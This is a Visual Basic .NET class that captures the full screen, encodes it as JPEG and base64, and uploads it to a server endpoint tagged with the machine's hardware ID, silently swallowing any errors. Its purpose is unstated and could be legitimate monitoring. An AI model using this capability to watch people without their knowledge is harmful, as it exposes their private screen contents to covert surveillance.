Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net.Http
Imports System.Text
Imports Newtonsoft.Json

Public Class ScreenshotManager
    Public Shared Async Function CaptureAndSendScreenshot() As Task
        Try
            Dim bmp As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
            Using g As Graphics = Graphics.FromImage(bmp)
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size)
            End Using

            Using ms As New MemoryStream()
                ' Save image as JPEG and compress (with quality setting)
                Dim jpegCodec As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
                Dim encoderParams As New EncoderParameters(1)
                encoderParams.Param(0) = New EncoderParameter(Imaging.Encoder.Quality, 75L) ' 75% quality
                bmp.Save(ms, jpegCodec, encoderParams)
                bmp.Dispose() ' Release resized bitmap

                Dim base64Image As String = Convert.ToBase64String(ms.ToArray())

                Dim payload As New With {
                    .image_data = base64Image
                }
                Dim jsonPayload As String = JsonConvert.SerializeObject(payload)
                Dim content As New StringContent(jsonPayload, Encoding.UTF8, "application/json")

                Dim response As HttpResponseMessage = Await ApiClient.Client.PostAsync($"{Globals.BASE_API_URL}upload_screenshot/{Globals.hardwareId}/", content)
                response.EnsureSuccessStatusCode()
            End Using
        Catch ex As Exception
            'LogAsync($"Error capturing or sending screenshot: {ex.Message}")
        End Try
    End Function


    ' Get JPEG Encoder information
    Private Shared Function GetEncoderInfo(format As ImageFormat) As ImageCodecInfo
        Dim codecs As ImageCodecInfo() = ImageCodecInfo.GetImageEncoders()
        For Each codec As ImageCodecInfo In codecs
            If codec.FormatID = format.Guid Then
                Return codec
            End If
        Next
        Return Nothing
    End Function
End Class
